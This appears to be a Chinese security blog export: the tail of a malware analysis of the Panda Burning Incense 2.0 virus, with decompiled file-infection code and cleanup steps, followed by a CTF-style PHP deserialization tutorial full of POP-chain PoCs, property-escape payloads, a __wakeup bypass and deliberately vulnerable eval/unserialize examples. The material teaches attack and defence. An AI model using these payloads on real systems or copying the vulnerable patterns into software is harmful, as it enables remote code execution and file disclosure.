sub_403E2C(); sub_403ED4(); lpNewFileName = (const CHAR *)sub_4040CC(); sub_40277C(); lpExistingFileName = (const CHAR *)sub_4040CC(); if ( !CopyFileA(lpExistingFileName, lpNewFileName, 0) ) break; } } else { sub_403E2C(); sub_403ED4(); lpNewFileName_1 = (const CHAR *)sub_4040CC(); sub_40277C(); lpExistingFileName_1 = (const CHAR *)sub_4040CC(); if ( !CopyFileA(lpExistingFileName_1, lpNewFileName_1, 0) ) break; } if ( (unsigned __int8)sub_40B994() ) { sub_40BA84(); sub_404018(); if ( !v1 ) { lpFileName_1 = (const CHAR *)sub_4040CC(); SetFileAttributesA(lpFileName_1, 0x80u); if ( !DeleteFileA(lpFileName_1) ) break; hObject = CreateFileA_0(lpFileName_1, 0x40000000u, 0, 0, 2u, 0, 0); CloseHandle_0(hObject); sub_402AD8(); *off_40D2BC = 2; sub_402874(); sub_402614(); sub_404260(); sub_402B88(); sub_402614(); sub_402C48(); sub_402614(); } } else { lpFileName_2 = (const CHAR *)sub_4040CC(); hObject_1 = CreateFileA_0(lpFileName_2, 0x40000000u, 0, 0, 2u, 0, 0); CloseHandle_0(hObject_1); sub_402AD8(); *off_40D2BC = 2; sub_402874(); sub_402614(); sub_404260(); sub_402B88(); sub_402614(); sub_402C48(); sub_402614(); } sub_403E2C(); sub_403ED4(); lpFileName_3 = (const CHAR *)sub_4040CC(); SetFileAttributesA(lpFileName_3, 7u); lpFileName_4 = (const CHAR *)sub_4040CC(); SetFileAttributesA(lpFileName_4, 7u); } } --v0; } while ( v0 ); } } __writefsdword(0, v13[0]); __writefsdword(0, v14[0]); sub_403C68(&amp;loc_40C01D); sub_403C68(v15);} 像什么u盘，手机，一插到电脑就会继续传播 这个或许就是当年为什么传播范围这么广的原因(○´･д･)ﾉ 2.5 文件感染流程 创建 .bat 批处理文件进行自我复制和清理 感染可执行文件和系统文件 创建大量隐藏文件 遍历磁盘文件，识别可执行文件 创建或修改 Desktop_.ini 文件（病毒的标记文件） 通过 SetFileAttributesA 设置文件属性，通常为隐藏和系统属性 使用 GetLocalTime 获取系统时间，可能用于感染时间标记 执行文件感染操作，通常是将病毒代码附加到正常文件中 实现异常处理机制避免感染过程中出错导致病毒被发现 3. 危害分析 文件损坏: 感染并损坏大量可执行文件 系统破坏: 修改系统文件和注册表，导致系统不稳定 数据丢失: 可能删除或损坏重要数据文件 网络瘫痪: 在局域网内快速传播，消耗网络资源 安全隐患: 关闭安全软件，使系统暴露在其他恶意软件攻击下 后门功能: 可能留有远程控制后门，导致系统被完全控制 4. 病毒来源根据代码特征和历史信息： 1.该病毒是”熊猫烧香”病毒的2.0版本，最初由中国”whboy”（李俊）编写 2.是2006-2007年间在中国广泛传播的知名病毒变种 3.主要针对Windows XP等早期Windows操作系统，现在win11，10都采用Windows NT内核 5. 解决方案5.1 紧急处理 断网隔离: 立即断开被感染计算机的网络连接 终止恶意进程: 结束 spoclsv.exe 等可疑进程 禁用自启动项: 删除注册表中的自启动项和启动目录中的恶意程序 5.2 清除步骤 删除恶意文件: 删除 %WINDIR%\\drivers\\spoclsv.exe 删除所有 Desktop_.ini 文件 删除所有 autorun.inf 文件 删除启动目录中的恶意程序 清理注册表: 删除 HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run 中的可疑项 恢复 HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\Folder\\Hidden\\SHOWALL\\CheckedValue 的值为1 使用杀毒工具: 使用杀毒软件进行全面扫描 推荐使用专杀工具进行清理 5.3 恢复与预防 系统恢复: 从干净的备份恢复系统或重装系统 更新补丁: 安装所有系统安全补丁 加强防护: 安装并更新杀毒软件 禁用自动运行功能 关闭不必要的网络共享 对U盘等移动存储设备进行扫描后再使用 定期备份重要数据 6. 总结熊猫烧香2.0是一种具有强破坏性和传染性的计算机病毒，通过多种方式实现自启动和传播。感染后会导致系统异常、数据损坏和安全隐患。及时的隔离、清除和预防措施是应对此类病毒的关键。","link":"/2025/12/11/%E4%BC%A0%E7%BB%9F%E7%97%85%E6%AF%92%E5%8F%8D%E5%88%86%E6%9E%90%E6%80%9D%E8%B7%AF/"},{"title":"","text":"php反序列化原理 前置1.php面向对象2.序列化基础知识 格式化出来不一样 序列化格式3.魔术方法触发条件 4.pop链的构造思路 1写poc代码 5.反序列化逃逸 6.session反序列化漏洞 7.phar反序列化 为协议读取phar，字段里面的字符串自动反序列化 文件上传，魔术方法触发 面向对象的基本概念面向过程:吃番茄炒蛋,自己炒面向对象:点餐番茄炒蛋 面向对象就是已经做好了的 面向对象的三个特折:对象的行为，对象的形态，对象的表示; 类的定义 1234类是定义了一件事物的抽象特点，它将数据的形式以及这些数据上的操作封装在一起。对象是具有类类型的变量，是对类的实例。内部构造:成员变量(属性)+成员函数(方法) 123属性：定义在类内部的变量，该变量的值对外是不可见的，但是可以通过成员函数访问，在类被实例化为对象后，该变量即可成为对象的属性。方法：定义在类的内部，可用于访问对象的数据 成员函数是可以访问成员变量的 12345678910111213141516&lt;?php highlight_file(__FILE__); class hero{ public $name='chengyaojin'; private $sex='man'; protected $shengao='165'; function jineng($var1) { echo $this-&gt;name; echo $var1; } } $cyj= new hero(); echo $cyj-&gt;name.&quot;&lt;br /&gt;&quot;; echo $cyj-&gt;sex.&quot;&lt;br /&gt;&quot;; echo $cyj-&gt;shengao.&quot;&lt;br /&gt;&quot;; ?&gt; hero 父类、hero2 子类 12345678公共的私有的受保护的：内部、子类可用public子类可用private子类不可用protected子类可用外部只可用public子类内部可用public和protected 反序列化基础知识1234567891011序列化的作用序列化的表达方式/格式方便存储方便数据传输空字符 null N;整型 666 i:666;浮点型 66.6 d:66.6Boolean true b:1; flase b:0;字符串 'benben' s:6长度:&quot;benben&quot;; 字符串序列化 123456&lt;?php $a='benben'; echo serialize($a);#s:6:&quot;benben&quot;; 数组序列化 12345&lt;?php $a=array('benben','dazhaung','laoliu'); echo serialize($a);# a:3:{i:0;s:6:&quot;benben&quot;;i:1;s:8:&quot;dazhaung&quot;;i:2;s:6:&quot;laoliu&quot;;} a:3是三个数组元素i:0是编号s:6:”benben”;是指benben长度为6i:1是编号 对象序列化 123456789101112&lt;?phphighlight_file(__FILE__);class test{ public $pub='benben'; function jineng(){ echo $this-&gt;pub; }}$a = new test();echo serialize($a);?&gt;# O:4:&quot;test&quot;:1:{s:3:&quot;pub&quot;;s:6:&quot;benben&quot;;} O:4:类名长度“test”类名:1变量数量:{s:3变量名长度:”pub”变量名字;s:6 $pub值的长度:”benben变量值”;} 属性不一样，序列化结果也不一样私有修饰符 123456789101112&lt;?phphighlight_file(__FILE__);class test{ private $pub='benben'; function jineng(){ echo $this-&gt;pub; }}$a = new test();echo serialize($a);?&gt;# O:4:&quot;test&quot;:1:{s:9:&quot;testpub&quot;;s:6:&quot;benben&quot;;} private $pub= pub前面加了test变成testpubtest是类名s:9为什么是9？因为类名test前后各加了一个%00(null,空字符) 1O:4:&quot;test&quot;:1:{s:9:&quot;testpub&quot;;s:6:&quot;benben&quot;;} O%3A4%3A%22test%22%3A1%3A%7Bs%3A9%3A%22%00test%00pub%22%3Bs%3A6%3A%22benben%22%3B%7D 成员属性调用对象 1234567891011121314151617181920&lt;?phphighlight_file(__FILE__);class test{ var $pub='benben'; function jineng(){ echo $this-&gt;pub; }}class test2{ var $ben; function __construct(){ $this-&gt;ben=new test(); }}$a = new test2();echo serialize($a);?&gt;# O:5:&quot;test2&quot;:1:{s:3:&quot;ben&quot;;O:4:&quot;test&quot;:1:{s:3:&quot;pub&quot;;s:6:&quot;benben&quot;;}}#序列化里的对象包含了一个序列化的对象O:4:&quot;test&quot;:1:{s:3:&quot;pub&quot;;s:6:&quot;benben&quot;;} 反序列化知识反序列化之后的内容是一个对象反序列化生成的对象里的值，由反序列化里的值提供，与原有类预定义的值无关反序列化不触发类的成员方法；需要调用方法后才能触发 将反序列化后的参数还原成实例化的对象 123456789101112131415161718192021222324252627282930313233&lt;?phphighlight_file(__FILE__);class test { public $a = 'benben'; protected $b = 666; private $c = false; public function displayVar() { echo $this-&gt;a; }}$d = new test();$d = serialize($d);echo $d.&quot;&lt;br /&gt;&quot;;echo urlencode($d).&quot;&lt;br /&gt;&quot;;$a = urlencode($d);$b = unserialize(urldecode($a));var_dump($b);?&gt;O:4:&quot;test&quot;:3:{s:1:&quot;a&quot;;s:6:&quot;benben&quot;;s:4:&quot;*b&quot;;i:666;s:7:&quot;testc&quot;;b:0;}O%3A4%3A%22test%22%3A3%3A%7Bs%3A1%3A%22a%22%3Bs%3A6%3A%22benben%22%3Bs%3A4%3A%22%00%2A%00b%22%3Bi%3A666%3Bs%3A7%3A%22%00test%00c%22%3Bb%3A0%3B%7Dobject(test)#1 (3) { [&quot;a&quot;]=&gt; string(6) &quot;benben&quot; [&quot;b&quot;:protected]=&gt; int(666) [&quot;c&quot;:&quot;test&quot;:private]=&gt; bool(false) }var_dump($d);class test#1 (3) { public $a =&gt; string(6) &quot;benben&quot; protected $b =&gt; int(666) private $c =&gt; bool(false)} 反序列化漏洞例题反序列化生成的对象里的值，由反序列化里的值提供：与原有类预定义的值无关：反序列化漏洞的成因：反序列化过程中，unserialize()接收的值（字符串）可控；通过更改这个值（字符串），得到所需要的代码，即生成的对象的属性值。反序列化不改变类的成员方法；需要调用方法后才能触发通过调用方法，触发代码执行。 123456789101112131415&lt;?phphighlight_file(__FILE__);error_reporting(0);class test{ public $a = 'echo &quot;this is test!!&quot;;'; public function displayVar() { eval($this-&gt;a); }}$get = $_GET[&quot;benben&quot;];$b = unserialize($get);$b-&gt;displayVar() ;?&gt; 12345678910111213141516&lt;?php class test{ public $a = &quot;system('ls');&quot;; public function displayVar() { eval($this-&gt;a); } } //$get = 'O:4:&quot;test&quot;:1:{s:1:&quot;a&quot;;s:13:&quot;system('ls');&quot;;}'; //$b = unserialize($get); //var_dump($b); //$b-&gt;displayVar() ; echo serialize(new test()); ?&gt;# O:4:&quot;test&quot;:1:{s:1:&quot;a&quot;;s:13:&quot;system('ls');&quot;;} 简洁版 1234567&lt;?phpclass test{ public $a = 'system(&quot;whoami&quot;);';}$obj = new test();echo serialize($obj);?&gt; 1?benben=O:4:&quot;test&quot;:1:{s:1:&quot;a&quot;;s:10:&quot;phpinfo();&quot;;} 魔术方法12实例化对象会调用construct销毁对象会调用destruct __destruct调用了两次destruct为什么？1.先销毁「反序列化生成的匿名对象」→ 触发第一次析构；2.再销毁 $test 指向的原始对象 → 触发第二次析构； 123456789101112&lt;?php class User { public function __destruct() { echo &quot;触发了析构函数1次&quot;.&quot;&lt;br /&gt;&quot; ; } } $test = new User(&quot;benben&quot;); $ser = serialize($test); unserialize($ser); ?&gt; 1234567891011121314&lt;?phphighlight_file(__FILE__);error_reporting(0);class User { var $cmd = &quot;echo 'dazhuang666!!';&quot; ; public function __destruct() { eval ($this-&gt;cmd); }}$ser = $_GET[&quot;benben&quot;];unserialize($ser);?&gt; 1234567891011&lt;?php class User { var $cmd = &quot;phpinfo();&quot;; public function __destruct() { eval ($this-&gt;cmd); } } echo serialize(new User());# O:4:&quot;User&quot;:1:{s:3:&quot;cmd&quot;;s:10:&quot;phpinfo();&quot;;} sleep序列化的时候会检查类中是否存在一个魔术方法__sleep先执行sleep在序列化 触发时机：序列化serialize()之前功能：对象被序列化之前触发，返回需要被序列化存储的成员属性，删除不必要的属性。参数：成员属性返回值：需要被序列化存储的成员属性 sleep例题 123456789101112131415161718192021&lt;?phphighlight_file(__FILE__);error_reporting(0);class User { const SITE = 'uusama'; public $username; public $nickname; private $password; public function __construct($username, $nickname, $password) { $this-&gt;username = $username; $this-&gt;nickname = $nickname; $this-&gt;password = $password; } public function __sleep() { system($this-&gt;username); }}$cmd = $_GET['benben'];$user = new User($cmd, 'b', 'c');echo serialize($user);?&gt; 可以直接执行命令 __wakeup()在反序列化之前__destruct在反序列化之后 wakeup 12345678910111213141516171819202122232425262728293031323334353637&lt;?php highlight_file(__FILE__); error_reporting(0); class User { const SITE = 'uusama'; public $username; public $nickname; private $password; private $order; public function __wakeup() { system($this-&gt;username); } } $user_ser = $_GET['benben']; unserialize($user_ser); ?&gt;&lt;?php class User { const SITE = 'uusama'; // 常量不参与序列化，无需处理 public $username; public $nickname; private $password; private $order; public function __construct() { $this-&gt;username = &quot;dir&quot;; $this-&gt;nickname = 'test'; $this-&gt;password = '123456'; $this-&gt;order = '001'; } } $user = new User(); $ser = serialize($user); echo &quot;\\n&quot;; echo $ser; ?&gt; tostring和invoke tostring：常用构造pop链类被当成字符串时的回应方法 __call：调用一个不存在的方法 触发时机：调用一个不存在的方法功能：参数：2个参数传参$arg1,$arg2返回值：调用的不存在的方法的名称和参数 123456789101112131415&lt;?phphighlight_file(__FILE__);error_reporting(0);class User { public function __call($arg1,$arg2) { echo &quot;$arg1,$arg2[0]&quot;; }}$test = new User() ;$test -&gt; callxxx('a');?&gt;callxxx,a__callstatic 触发时机：静态调用或调用成员常量时使用的方法不存在功能：参数：2个参数传参$arg1,$arg2返回值：调用的不存在的方法的名称和参数 123456789101112131415Warning: The magic method __callStatic() must have public visibility and be static in D:\\Soft\\Penetration\\TrafficTools\\phpStudy\\WWW\\php_ser_Class\\class10\\2.php on line 5&lt;?phphighlight_file(__FILE__);error_reporting(0);class User { public function __callStatic($arg1,$arg2) { echo &quot;$arg1,$arg2[0]&quot;; }}$test = new User() ;$test::callxxx('a');?&gt;callxxx,a 特性 __call __callStatic 触发时机 调用对象实例的非静态、不存在 / 不可访问方法时触发 调用类的静态、不存在 / 不可访问方法时触发 方法修饰符 必须是 public（不能加 static） 必须是 public static（强制加 static） 调用方式 通过对象实例调用（$obj-&gt;xxx()） 通过类名调用（Class::xxx()），或对象实例静态调用（不推荐） 上下文 拥有对象上下文（可访问 $this） 无对象上下文（不可访问 $this，仅能访问静态属性 / 方法） 语法要求 无 static 修饰，否则报错 必须加 static 修饰，否则报错 __GET()触发时机：调用的成员属性不存在功能：参数：传参$arg1返回值：不存在的成员属性的名称 123456789101112131415161718192021222324252627282930&lt;?phphighlight_file(__FILE__);error_reporting(0);class User { public $var1; public function __get($arg1) { echo $arg1; }}$test = new User() ;$test -&gt;var2;?&gt;# var2&lt;?php class User { public $var1=&quot;benben&quot;; public function __get($arg1) { echo $arg1; } } $test = new User() ; $test -&gt;var1; echo $test -&gt;var1; ?&gt;# benben这里就没有调用GET __set()触发时机：给不存在的成员属性赋值功能：参数：传参$arg1,$arg2返回值：不存在的成员属性的名称和赋的值 123456789101112131415&lt;?phphighlight_file(__FILE__);error_reporting(0);class User { public $var1; public function __set($arg1 ,$arg2) { echo $arg1.','.$arg2; }}$test = new User() ;$test -&gt;var2=1;?&gt;# var2,1 1__isset() 触发时机：对不可访问属性使用isset()或empty(0时，isset0会被调用。功能：参数：传参5arg1返回值：不存在的成员属性的名称 isset()用的成员属性var不可访问或不存在 123456789101112131415&lt;?phphighlight_file(__FILE__);error_reporting(0);class User { private $var; public function __isset($arg1 ) { echo $arg1; }}$test = new User() ;isset($test-&gt;var);?&gt;# var __unset()触发时机：对不可访问属性使用unset()时功能参数：传参Sarg1返回值：不存在的成员属性的名称 12345678910111213141516&lt;?phphighlight_file(__FILE__);error_reporting(0);class User { private $var; public function __unset($arg1 ) { echo $arg1; }}$test = new User() ;unset($test-&gt;var);?&gt;# var# 返回不存在的成员属性的名称 __invoke()：把对象当成函数调用 __clone()触发时机：当使用clone关键字拷贝完成一个对象后，新对象会自动调用定义的魔术方法clone()功能：参数：返回值： 123456789101112131415&lt;?phphighlight_file(__FILE__);error_reporting(0);class User { private $var; public function __clone( ) { echo &quot;__clone test&quot;; }}$test = new User() ;$newclass = clone($test)?&gt;# __clone test # 先new了一个User然后把备份给newclass，会自动触发 pop链前置12345678910111213141516171819202122232425&lt;?phphighlight_file(__FILE__);error_reporting(0);class index { private $test; public function __construct(){ $this-&gt;test = new normal(); } public function __destruct(){ $this-&gt;test-&gt;action(); }}class normal { public function action(){ echo &quot;please attack me&quot;; }}class evil { var $test2; public function action(){ eval($this-&gt;test2); }}unserialize($_GET['test']);?&gt; 反推法 123456利用点eval($this-&gt;test2);action肯定不会被凭空执行找调用actiondestruct调用了action 定义test是一个对象并且它里面的值是obj evil反序列化不会调用construct实例化的时候才会调用contruct exp 1234567891011121314151617181920212223242526&lt;?php class index { private $test; public function __construct(){ $this-&gt;test = new evil(); } // public function __destruct(){ // $this-&gt;test-&gt;action(); // } } //class normal { // public function action(){ // echo &quot;please attack me&quot;; // } //} class evil { var $test2=&quot;phpinfo();&quot;; // public function action(){ // eval($this-&gt;test2); // } } $a=new index(); echo serialize($a); echo &quot;\\n&quot;; echo urlencode(serialize($a)); ?&gt; 另一种构造方法在类外赋值 1234567891011121314151617&lt;?phpclass index { private $test;}class evil { var $test2;}$a=new evil();$a-&gt;test2=&quot;phpinfo();&quot;;$b=new index();$b-&gt;test2=$a;echo &quot;\\n&quot;;echo serialize($b);echo &quot;\\n&quot;;echo urlencode(serialize($b)); 魔术&amp;POP前置12345678910111213141516171819&lt;?phphighlight_file(__FILE__);error_reporting(0);class fast { public $source; public function __wakeup(){ echo &quot;wakeup is here!!&quot;; echo $this-&gt;source; }}class sec { var $benben; public function __tostring(){ echo &quot;tostring is here!!&quot;; }}$b = $_GET['benben'];unserialize($b);?&gt; 12345678910111213141516171819&lt;?phphighlight_file(__FILE__);error_reporting(0);class fast { public $source; public function __wakeup(){ echo &quot;wakeup is here!!&quot;; echo $this-&gt;source; }}class sec { var $benben; public function __tostring(){ echo &quot;tostring is here!!&quot;; }}$b = $_GET['benben'];unserialize($b);?&gt; 123456789101112131415161718'O:3:&quot;sec&quot;:1:{s:6:&quot;benben&quot;;N;}'&lt;?php class fast { public $source; } class sec { var $benben; } $a=new sec(); //给source要一个sec类，因为要调用tostring方法 $b=new fast(); $b-&gt;source=$a; echo serialize($b); ?&gt;O:4:&quot;fast&quot;:1:{s:6:&quot;source&quot;;O:3:&quot;sec&quot;:1:{s:6:&quot;benben&quot;;N;}} tostring调用成功 POP链构造&amp;POC的编写在反序列化中，我们能控制的数据就是对象中的属性值（成员变量），所以在PHP反序列化中有一种漏洞利用方法叫”面向属性编程”，即PoP(Property Oriented Programming)。POP链就是利用魔法方法在里面进行多次跳转然后获取敏感数据的，一种payload。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657&lt;?php//flag is in flag.phphighlight_file(__FILE__);error_reporting(0);class Modifier { private $var; public function append($value) { include($value); echo $flag; } public function __invoke(){ $this-&gt;append($this-&gt;var);//要调用Modifier,才能append }}class Show{ public $source;//赋Show类 public $str;//赋Test类 public function __toString(){ // 访问 Test 对象的 source 属性 return $this-&gt;str-&gt;source;//访问一个不存在的属性时，会触发 __get()魔术方法，source属性在Tes类中是不存在的 } public function __wakeup(){//反序列化会自动触发 echo $this-&gt;source;//给source赋Show类，才能触发toString }}class Test{ public $p; public function __construct(){ $this-&gt;p = array(); } public function __get($key){ $function = $this-&gt;p; return $function(); }}if(isset($_GET['pop'])){ unserialize($_GET['pop']);}?&gt;目标是echo $flag倒推法需要找include($value);是哪里的？参数传进来的value的值=flag.php,才可以输出flaginvoke调用了append，想办法修改$this-&gt;var为flag.php当尝试以调用函数的方式调用一个对象时，__invoke() 方法会被自动调用。那个地方能够输出呢？return $function(); function()是一个p，修改pp=Modefiler，调用触发get方法才能进行下面的操作get获得一个类的成员变量时调用给$str赋值为对象Test，而Test中不存在成员属性source，则可以触发Test里的成员方法getwakeup赋值为对象Show，当echo时会调用toString 下面是倒推 12345678910111213141516171819202122232425262728293031323334unserialize() → Show::__wakeup() → echo对象 → Show::__toString() → 访问不存在的属性 → Test::__get() → 调用对象作为函数 → Modifier::__invoke() → Modifier::append() → include('flag.php')Show对象 (source → 引用#1) ↓ source属性 → 指向Show对象自身 (r:1) str属性 → Test对象 ↓ p属性 → Modifier对象 ↓ var属性 → &quot;flag.php&quot;O:4:&quot;Show&quot;:2:{s:6:&quot;source&quot;;r:1;s:3:&quot;str&quot;;O:4:&quot;Test&quot;:1:{s:1:&quot;p&quot;;O:8:&quot;Modifier&quot;:1:{s:13:&quot; Modifier var&quot;;s:8:&quot;flag.php&quot;;}}}&lt;?php//flag is in flag.phpclass Modifier { private $var='flag.php';}class Show{ public $source;//给source赋Show类，才能触发toString public $str;//赋Test类，调用Test对象作为函数触发GET方法}class Test{ public $p;//赋值Modifier类}$mod=new Modifier();$test=new Test();$test-&gt;p=$mod;$show=new Show();$show-&gt;source=$show;$show-&gt;str=$test;echo serialize($show);echo &quot;\\n&quot;;echo urlencode(serialize($show));?&gt; 字符串逃逸&amp;字符串减少–基础反序列化以;}结束，后面的字符串不影响正常的反序列化 属性逃逸 一般在数据先经过一次serialize再经过unserialize,在这个中间反序列化的字符串变多或者变少的时候有可能存在反序列化属性逃逸。 123456789&lt;?phpclass A{ public $v1=&quot;a&quot;;}echo serialize(new A());// O:1:&quot;A&quot;:1:{s:2:&quot;v1&quot;;s:1:&quot;a&quot;;}$b='O:1:&quot;A&quot;:2:{s:2:&quot;v1&quot;;s:1:&quot;a&quot;;s:2:&quot;v3&quot;;s:3:&quot;ben&quot;;}';var_dump(unserialize($b)); 1$b='O:1:&quot;A&quot;:2:{s:2:&quot;v1&quot;;s:1:&quot;a&quot;;s:2:&quot;v3&quot;;s:3:&quot;ben&quot;;}'; $b=’O:1:”A”:1:{s:2:”v1”;s:1:”a”;s:2:”v3”;s:3:”ben”;}’; 返回bool(false)不能反序列化 123456789101112131415161718192021222324252627&lt;?php class A{ public $v1=&quot;a1&quot;; public $v2=&quot;dazhuang&quot;; public $v3=&quot;sssss&quot;; } echo serialize(new A()); // O:1:&quot;A&quot;:1:{s:2:&quot;v1&quot;;s:1:&quot;a&quot;;} $b='O:1:&quot;A&quot;:2:{s:2:&quot;v1&quot;;s:3:&quot;a88&quot;;s:2:&quot;v3&quot;;s:3:&quot;ben&quot;;}'; //v2从A类获得的var_dump(unserialize($b));O:1:&quot;A&quot;:3:{s:2:&quot;v1&quot;;s:2:&quot;a1&quot;;s:2:&quot;v2&quot;;s:8:&quot;dazhuang&quot;;s:2:&quot;v3&quot;;s:5:&quot;sssss&quot;;}class A#1 (3) { public $v1 =&gt; string(3) &quot;a88&quot; public $v2 =&gt; string(8) &quot;dazhuang&quot; public $v3 =&gt; string(3) &quot;ben&quot;} 下面就去逃逸目标：逃逸出来一个v3，值为123 下面这段代码是不成功的代码因为把system()删掉了 12345678910&lt;?php class A{ public $v1 = &quot;abcsystem()&quot;; public $v2 = '123'; } $data = serialize(new A()); $data = str_replace(&quot;system()&quot;,&quot;&quot;,$data);//出现system()就删掉 var_dump(unserialize($data));//得到abc ?&gt; 字符串逃逸 123456反序列化字符串减少逃逸，多逃逸出一个成员属性第一个字符串减少，吃掉有效代码，在第二个字符串构造代码反序列化字符串增多逃逸：构造一个逃逸成员属性第一个字符串增多，吐出多余代码，把多余代码构造成逃逸的成员属性 双引号是格式符号还是字符串长度3来判断的 1$b='O:1' 成员属性数量一致成员属性名称长度一致，内容长度一致 1O:1:&quot;A&quot;:2:{s:2:&quot;v1&quot;;s:11:&quot;abc&quot;;s:2:&quot;v2&quot;;s:3:&quot;123&quot;;} 修改v2的值形成123的逃逸把前面的值全吃了绿色变成功能性代码 逃逸代码 1234567891011&lt;?php class A{ public $v1 = &quot;abcsystem()system()system()&quot;; public $v2 = '1234567&quot;;s:2:&quot;v3&quot;;s:3:&quot;123&quot;;}'; } $data = serialize(new A()); $data = str_replace(&quot;system()&quot;,&quot;&quot;,$data);//出现system()就删掉 var_dump(unserialize($data));//得到abc ?&gt; 字符串逃逸-增多 22个ls占4422个pwd占66 1lslslslslslslslslslslslslslslslslslslslslsls&quot;;s:2:&quot;v3&quot;;s:3:&quot;666&quot;;} 字符串逃逸成代码 1判断pass=='escaping' 字符串逃逸增加例题1234567891011121314151617181920212223242526272829&lt;?php highlight_file(__FILE__); error_reporting(0); function filter($name){ $safe=array(&quot;flag&quot;,&quot;php&quot;); $name=str_replace($safe,&quot;hack&quot;,$name); return $name;//需要返回escaping } class test{ var $user; var $pass='daydream'; function __construct($user){ $this-&gt;user=$user; } } $param=$_GET['param']; $param=serialize(new test($param));//new test($param)触发contruct，wakeup $profile=unserialize(filter($param));//过滤flag和php，然后反序列化 if ($profile-&gt;pass=='escaping'){ echo file_get_contents(&quot;flag.php&quot;); } ?&gt;用户输入(GET param) → 传入test类的构造方法，实例化test对象 → 序列化该test对象（得到含默认pass=daydream的序列化字符串）→ filter函数过滤序列化字符串（替换flag/php为hack）→ 反序列化过滤后的字符串（得到$profile对象）→ 检查$profile-&gt;pass是否等于'escaping' → 满足则读取flag.php 怎么判断是增加的？ 123456789从php到hack是增加的，所以是增加的&lt;?php class test{ var $user='benben'; var $pass='escaping'; } echo serialize(new test()); ?&gt; 得到 1O:4:&quot;test&quot;:2:{s:4:&quot;user&quot;;s:4:&quot;hack&quot;;s:4:&quot;pass&quot;;s:8:&quot;escaping&quot;;} 然后构造逃逸 1O:4:&quot;test&quot;:2:{s:4:&quot;user&quot;;s:4:&quot;hack&quot;;s:4:&quot;pass&quot;;s:8:&quot;escaping&quot;;} 要逃逸escaping目标逃逸代码php被替换成hack需要吐出27个字符，然后需要补全结构，所以需要吐出29个字符 1user=&quot;phpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphp&quot;;s:4:&quot;pass&quot;;s:8:&quot;escaping&quot;;} 写29个php为什么，一个php吐出一个字符，要29个php 1?param=&quot;phpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphp&quot;;s:4:&quot;pass&quot;;s:8:&quot;escaping&quot;;} 查看源码得到flag 字符串逃逸减少例题123456789101112131415161718192021222324252627282930313233343536373839404142&lt;?phphighlight_file(__FILE__);error_reporting(0);function filter($name){ $safe=array(&quot;flag&quot;,&quot;php&quot;); $name=str_replace($safe,&quot;hk&quot;,$name); return $name;}class test{ var $user; var $pass; var $vip = false ; function __construct($user,$pass){ $this-&gt;user=$user; $this-&gt;pass=$pass; }}$param=$_GET['user'];$pass=$_GET['pass'];$param=serialize(new test($param,$pass));$profile=unserialize(filter($param));if ($profile-&gt;vip){ echo file_get_contents(&quot;flag.php&quot;);}?&gt;写题流程1.字符串过滤后是减少还是增多 flag，php明显比hk长所以是减少2.构造关键成员属性序列化字符串 $vip=true3.变少则判断吃掉的内容，并计算长度&lt;?php class test { var $user = &quot;flag&quot;; var $pass = &quot;benben&quot;; var $vip = true; } echo serialize(new test()); ?&gt;O:4:&quot;test&quot;:3:{s:4:&quot;user&quot;;s:4:&quot;flag&quot;;s:4:&quot;pass&quot;;s:6:&quot;benben&quot;;s:3:&quot;vip&quot;;b:1;} 构造减少字符串逃逸 保留 1&quot;;s:4:&quot;pass&quot;;s:6:&quot;benben&quot;;s:3:&quot;vip&quot;;b:1;} 最终逃逸 1;s:3:&quot;vip&quot;;b:1;} 要算吃掉那一部分 123456789101112131415161718192021222324&lt;?phpfunction filter($name){ $safe=array(&quot;flag&quot;,&quot;php&quot;); $name=str_replace($safe,&quot;hk&quot;,$name); return $name;}class test{ var $user; var $pass; var $vip = false ; function __construct($user,$pass){ $this-&gt;user=$user; $this-&gt;pass=$pass; }}$param='flagflagflagflagflagflagflagflagflagflag';$pass='1&quot;;s:4:&quot;pass&quot;;s:6:&quot;benben&quot;;s:3:&quot;vip&quot;;b:1;}';$param=serialize(new test($param,$pass));$profile=unserialize(filter($param));if ($profile-&gt;vip){ echo file_get_contents(&quot;flag.php&quot;);}?&gt; weakup魔术方法绕过一般不单独出 1__wakeup() CVE-2016-7124反序列化 当序列化字符串中声明的属性数量大于实际实际类中定义的属性数量多时，__wakeup()方法会被跳过。PHP5&lt;5.6.25PHP7&lt;7.0.10 1O:4:&quot;test&quot; 12345678910111213141516171819202122232425262728&lt;?php error_reporting(0); class secret{ var $file='index.php'; public function __construct($file){ $this-&gt;file=$file; } function __destruct(){ include_once($this-&gt;file); echo $flag; } function __wakeup(){ $this-&gt;file='index.php'; } } $cmd=$_GET['cmd']; if (!isset($cmd)){ highlight_file(__FILE__); } else{ if (preg_match('/[oc]:\\d+:/i',$cmd)){ echo &quot;Are you daydreaming?&quot;; } else{ unserialize($cmd); } } //sercet in flag.php ?&gt; 1234567891011O:+6:&quot;sercet&quot;:2:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}&lt;?phpclass secret{ var $file = 'flag.php';}//echo serialize(new secret());//O:6:&quot;secret&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}$a='O:+6:&quot;secret&quot;:2:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}';echo urlencode($a); 不显示flag我还以为我脚本写错 引用1234567891011121314151617181920212223242526&lt;?phphighlight_file(__FILE__);error_reporting(0);include(&quot;flag.php&quot;);class just4fun { var $enter; var $secret;}if (isset($_GET['pass'])) { $pass = $_GET['pass']; $pass=str_replace('*','\\*',$pass);}$o = unserialize($pass);if ($o) { $o-&gt;secret = &quot;*&quot;; if ($o-&gt;secret === $o-&gt;enter) echo &quot;Congratulation! Here is my secret: &quot;.$flag; else echo &quot;Oh no... You can't fool me&quot;;}else echo &quot;are you trolling?&quot;;?&gt;Congratulation! Here is my secret: ctfstu{5c202c62-7567-4fa0-a370-134fe9d16ce7} 1234567891011&lt;?php class just4fun { var $enter; var $secret; } $a=new just4fun(); $a -&gt;enter = &amp;$a -&gt;secret; echo serialize($a); ?&gt;O:8:&quot;just4fun&quot;:2:{s:5:&quot;enter&quot;;N;s:6:&quot;secret&quot;;R:2;} R代表引用，2代表enter类似一个快捷方式 